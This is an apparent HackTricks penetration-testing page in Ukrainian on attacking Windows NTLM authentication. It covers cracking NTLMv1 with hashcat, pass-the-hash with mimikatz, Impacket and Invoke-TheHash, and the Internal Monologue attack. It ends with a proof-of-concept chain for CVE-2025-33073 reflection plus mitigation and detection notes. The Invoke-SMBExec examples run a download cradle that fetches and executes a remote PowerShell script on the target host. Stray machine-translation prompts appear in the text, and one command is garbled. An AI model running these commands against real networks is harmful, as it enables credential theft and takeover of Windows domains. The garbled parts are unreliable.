# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Основна інформація

У середовищах, де працюють **Windows XP і Server 2003**, використовуються LM (Lan Manager) hashes, хоча загальновідомо, що їх можна легко скомпрометувати. Певний LM hash, `AAD3B435B51404EEAAD3B435B51404EE`, вказує на те, що LM не використовується, і є hash для порожнього рядка.

За замовчуванням основним методом є протокол автентифікації **Kerberos**. NTLM (NT LAN Manager) використовується за певних обставин: відсутність Active Directory, відсутність домену, несправність Kerberos через неправильну конфігурацію або спроба встановити з'єднання за IP-адресою замість дійсного hostname.

Наявність заголовка **"NTLMSSP"** у мережевих пакетах сигналізує про процес автентифікації NTLM.

Підтримка протоколів автентифікації — LM, NTLMv1 і NTLMv2 — забезпечується певною DLL, розташованою за адресою `%windir%\Windows\System32\msv1\_0.dll`.

**Ключові моменти**:

- LM hashes є вразливими, а порожній LM hash (`AAD3B435B51404EEAAD3B435B51404EE`) означає, що він не використовується.
- Kerberos є стандартним методом автентифікації, а NTLM використовується лише за певних умов.
- Пакети автентифікації NTLM можна ідентифікувати за заголовком "NTLMSSP".
- Протоколи LM, NTLMv1 і NTLMv2 підтримуються системним файлом `msv1\_0.dll`.

## LM, NTLMv1 і NTLMv2

Можна перевірити та налаштувати протокол, який буде використовуватися:

### GUI

Виконайте _secpol.msc_ -> Локальні політики -> Параметри безпеки -> Безпека мережі: рівень автентифікації LAN Manager. Існує 6 рівнів (від 0 до 5).

![LM, NTLMv1 і NTLMv2 — GUI: виконайте secpol.msc — Локальні політики — Параметри безпеки — Безпека мережі: рівень автентифікації LAN Manager. Існує 6 рівнів (від 0 до 5)](<../../images/image (919).png>)

### Registry

Це встановить рівень 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Можливі значення:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Базова схема автентифікації домену NTLM

1. **Користувач** вводить свої **облікові дані**
2. Клієнтська машина **надсилає запит на автентифікацію**, передаючи **ім’я домену** та **ім’я користувача**
3. **Сервер** надсилає **challenge**
4. **Клієнт шифрує** **challenge**, використовуючи hash пароля як ключ, і надсилає його як відповідь
5. **Сервер надсилає** до **контролера домену** **ім’я домену, ім’я користувача, challenge і відповідь**. Якщо **Active Directory** не налаштовано або ім’я домену збігається з ім’ям сервера, облікові дані **перевіряються локально**.
6. **Контролер домену перевіряє, чи все правильно**, і надсилає інформацію серверу

**Сервер** і **контролер домену** можуть створити **Secure Channel** через сервер **Netlogon**, оскільки контролер домену знає пароль сервера (він міститься в базі **NTDS.DIT**).

### Локальна схема автентифікації NTLM

Автентифікація відбувається так само, як описано **вище, але** **сервер** знає **hash користувача**, який намагається автентифікуватися, у файлі **SAM**. Тому замість звернення до контролера домену **сервер сам перевіряє**, чи може користувач автентифікуватися.

### NTLMv1 Challenge

**Довжина challenge становить 8 байтів**, а **відповідь** має довжину **24 байти**.

**NT hash (16 байт)** ділиться на **3 частини по 7 байт кожна** (7B + 7B + (2B+0x00\*5)): **остання частина заповнюється нулями**. Потім **challenge** шифрується окремо кожною частиною, а **зашифровані** байти **об’єднуються**. Усього: 8B + 8B + 8B = 24 байти.

**Проблеми**:

- Відсутність **випадковості**
- 3 частини можна **атакувати окремо**, щоб знайти NT hash
- **DES можна зламати**
- 3-й ключ завжди складається з **5 нулів**
- За умови **однакового challenge** **відповідь** буде **однаковою**. Отже, можна передати жертві як **challenge** рядок "**1122334455667788**" і атакувати відповідь, використовуючи **попередньо обчислені rainbow tables**.

### NTLMv1 attack

Сьогодні середовища з налаштованою Unconstrained Delegation трапляються дедалі рідше, але це не означає, що не можна **зловживати сервісом Print Spooler**, якщо його налаштовано.

Можна використати деякі облікові дані/сесії, які вже є в AD, щоб **попросити принтер автентифікуватися** на **хості під вашим контролем**. Потім за допомогою `metasploit auxiliary/server/capture/smb` або `responder` можна **встановити challenge автентифікації як 1122334455667788**, перехопити спробу автентифікації та, якщо її було виконано з використанням **NTLMv1**, **зламати її**.\
Якщо використовується `responder`, можна спробувати **використати прапорець `--lm`**, щоб спробувати **понизити версію** **автентифікації**.\
_Зверніть увагу, що для цієї техніки автентифікацію потрібно виконувати з використанням NTLMv1 (NTLMv2 не підходить)._

Пам’ятайте, що під час автентифікації принтер використовуватиме обліковий запис комп’ютера, а облікові записи комп’ютерів мають **довгі та випадкові паролі**, які ви **ймовірно не зможете зламати** за допомогою звичайних **словників**. Однак автентифікація **NTLMv1** **використовує DES** ([більше інформації тут](#ntlmv1-challenge)), тому за допомогою спеціалізованих сервісів для злому DES його можна зламати (наприклад, можна використати [https://crack.sh/](https://crack.sh) або [https://ntlmv1.com/](https://ntlmv1.com)).

### NTLMv1 attack with hashcat

NTLMv1 також можна зламати за допомогою NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi), який форматує повідомлення NTLMv1 у спосіб, що дає змогу зламати їх за допомогою hashcat.<sup>[[1]](#references)</sup>

Команда
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
виведе наведене нижче:
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Будь ласка, надайте текст або файл, вміст якого потрібно створити й перекласти.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Запустіть hashcat (розподілений запуск найкраще організувати за допомогою такого інструмента, як hashtopolis), інакше це займе кілька днів.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
У цьому випадку ми знаємо, що пароль — password, тож для демонстрації ми схитруємо:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Тепер нам потрібно скористатися hashcat-utilities, щоб перетворити зламані ключі des на частини NTLM hash:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Please provide the final part of the text to translate.
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Please provide the text you want me to combine and translate.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**Довжина challenge становить 8 bytes**, і надсилаються **2 responses**: одна має довжину **24 bytes**, а довжина **іншої** є **змінною**.

**Перший response** створюється шляхом шифрування за допомогою **HMAC_MD5** **string**, що складається з **client і domain**, із використанням як **key** **hash MD4** від **NT hash**. Потім **result** використовується як **key** для шифрування за допомогою **HMAC_MD5** **challenge**. До нього додається **client challenge** довжиною 8 bytes. Разом: 24 B.

**Другий response** створюється з використанням **кількох значень** (нового client challenge, **timestamp**, щоб запобігти **replay attacks**...)

Якщо у вас є **pcap, у якому зафіксовано успішний процес authentication**, ви можете скористатися цим guide, щоб отримати domain, username, challenge і response та спробувати зламати password: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)<sup>[[2]](#references)</sup>

## Pass-the-Hash

**Отримавши hash жертви**, ви можете використати його, щоб **імперсонувати** її.\
Потрібно використати **tool**, який **виконає** **NTLM authentication за допомогою** цього **hash**, **або** можна створити новий **sessionlogon** і **inject** цей **hash** у **LSASS**, щоб під час виконання будь-якої **NTLM authentication** використовувався **цей hash.** Саме останню опцію використовує mimikatz.

**Пам’ятайте, що Pass-the-Hash attacks можна також виконувати за допомогою Computer accounts.**

### **Mimikatz**

**Потрібно запускати від імені адміністратора**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Це запустить процес, який належатиме користувачу, що запустив mimikatz, але всередині LSASS збережені облікові дані будуть тими, що вказані в параметрах mimikatz. Після цього ви зможете отримувати доступ до мережевих ресурсів так, ніби ви є цим користувачем (подібно до трюку `runas /netonly`, але вам не потрібно знати пароль у plain-text).

### Pass-the-Hash з linux

Ви можете отримати виконання коду на машинах Windows, використовуючи Pass-the-Hash з Linux.\
[**Перейдіть сюди, щоб дізнатися, як це зробити.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Скомпільовані інструменти Impacket для Windows

Ви можете завантажити [бінарні файли impacket для Windows тут](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (У цьому випадку потрібно вказати команду; cmd.exe і powershell.exe не підходять для отримання інтерактивної оболонки)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Є ще кілька бінарних файлів Impacket...

### Invoke-TheHash

Ви можете отримати PowerShell-скрипти тут: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Ця функція є **поєднанням усіх інших**. Ви можете вказати **кілька хостів**, **виключити** деякі з них і **вибрати** потрібну **опцію** (_SMBExec, WMIExec, SMBClient, SMBEnum_). Якщо ви виберете **SMBExec** або **WMIExec**, але **не вкажете** параметр _**Command**_, функція лише **перевірить**, чи маєте ви **достатні дозволи**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Потрібно запускати від імені адміністратора**

Цей tool робить те саме, що й mimikatz (модифікує пам'ять LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Ручне віддалене виконання команд у Windows з іменем користувача та паролем


{{#ref}}
../lateral-movement/
{{#endref}}

## Витягування облікових даних із Windows Host

**Докладніше про** [**отримання облікових даних із Windows host читайте на цій сторінці**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## Internal Monologue attack

Internal Monologue Attack — це прихована техніка вилучення облікових даних, яка дає змогу attacker отримати NTLM hashes із машини жертви **без прямої взаємодії з процесом LSASS**. На відміну від Mimikatz, який безпосередньо читає hashes з пам’яті й часто блокується endpoint security solutions або Credential Guard, ця атака використовує **локальні виклики пакета автентифікації NTLM (MSV1_0) через Security Support Provider Interface (SSPI)**. Спочатку attacker **знижує налаштування NTLM** (наприклад, LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic), щоб дозволити NetNTLMv1. Потім він імітує наявні user tokens, отримані з запущених процесів, і локально запускає NTLM authentication, щоб згенерувати відповіді NetNTLMv1, використовуючи відомий challenge.<sup>[[4]](#references)</sup>

Після перехоплення цих відповідей NetNTLMv1 attacker може швидко відновити оригінальні NTLM hashes за допомогою **попередньо обчислених rainbow tables**, що дає змогу виконувати подальші Pass-the-Hash attacks для lateral movement. Важливо, що Internal Monologue Attack залишається прихованою, оскільки не генерує network traffic, не інжектить code і не запускає прямі memory dumps, тому її важче виявити defenders порівняно з традиційними методами на кшталт Mimikatz.

Якщо NetNTLMv1 не приймається через застосування security policies, attacker може не отримати відповідь NetNTLMv1.

Для обробки цього випадку Internal Monologue tool було оновлено: він динамічно отримує server token за допомогою `AcceptSecurityContext()`, щоб **перехоплювати відповіді NetNTLMv2**, якщо NetNTLMv1 не спрацьовує. Хоча NetNTLMv2 набагато складніше crack, він усе одно відкриває шлях для relay attacks або offline brute-force у деяких обмежених випадках.

PoC можна знайти за посиланням **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.

## NTLM Relay and Responder

**Докладніший guide щодо виконання цих attacks наведено тут:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Парсинг NTLM challenges із network capture

**Можна використати** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM & Kerberos *Reflection* через Serialized SPNs (CVE-2025-33073)

Windows містить кілька mitigation mechanisms, які намагаються запобігти *reflection* attacks, коли NTLM- або Kerberos authentication, що походить від host, relayed back до **того самого** host для отримання SYSTEM privileges.

Microsoft усунула більшість public chains за допомогою MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) та подальших patches, однак **CVE-2025-33073** показує, що protections усе ще можна обійти, зловживаючи тим, як **SMB client truncates Service Principal Names (SPNs)**, що містять *marshalled* (serialized) target-info.<sup>[[5]](#references)[[6]](#references)</sup>

### TL;DR про bug
1. Attacker реєструє **DNS A-record**, label якого кодує marshalled SPN, наприклад:
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Victim змушують пройти authentication до цього hostname (PetitPotam, DFSCoerce тощо).
3. Коли SMB client передає target string `cifs/srv11UWhRCAAAAA…` до `lsasrv!LsapCheckMarshalledTargetInfo`, виклик `CredUnmarshalTargetInfo` **видаляє** serialized blob, залишаючи **`cifs/srv1`**.
4. `msv1_0!SspIsTargetLocalhost` (або еквівалент Kerberos) тепер вважає target *localhost*, оскільки коротка частина host відповідає імені комп’ютера (`SRV1`).
5. У результаті server встановлює `NTLMSSP_NEGOTIATE_LOCAL_CALL` та інжектить **SYSTEM access-token LSASS** у context (для Kerberos створюється subsession key із позначкою SYSTEM).
6. Relaying цієї authentication за допомогою `ntlmrelayx.py` **або** `krbrelayx.py` надає повні SYSTEM rights на тому самому host.<sup>[[5]](#references)</sup>

### Quick PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Виправлення та заходи пом'якшення
* KB patch для **CVE-2025-33073** додає перевірку в `mrxsmb.sys::SmbCeCreateSrvCall`, яка блокує будь-яке SMB-з'єднання, ціль якого містить marshalled info (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Увімкніть **SMB signing**, щоб запобігти reflection навіть на невиправлених хостах.
* Відстежуйте DNS-записи, схожі на `*<base64>...*`, і блокуйте coercion vectors (PetitPotam, DFSCoerce, AuthIP...).

### Ідеї для виявлення
* Мережеві захоплення з `NTLMSSP_NEGOTIATE_LOCAL_CALL`, де IP клієнта ≠ IP сервера.
* Kerberos AP-REQ, що містить subsession key і client principal, який дорівнює імені хоста.
* Windows Event 4624/4648 SYSTEM logons, після яких на тому самому хості одразу виконуються remote SMB writes.<sup>[[5]](#references)</sup>

Щодо **березневого 2026** варіанта local reflection, який використовує **SMB arbitrary ports** і **TCP connection reuse** для отримання `NT AUTHORITY\SYSTEM`, дивіться:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [Cracking an NTLMv2 Hash](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash Utilities](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
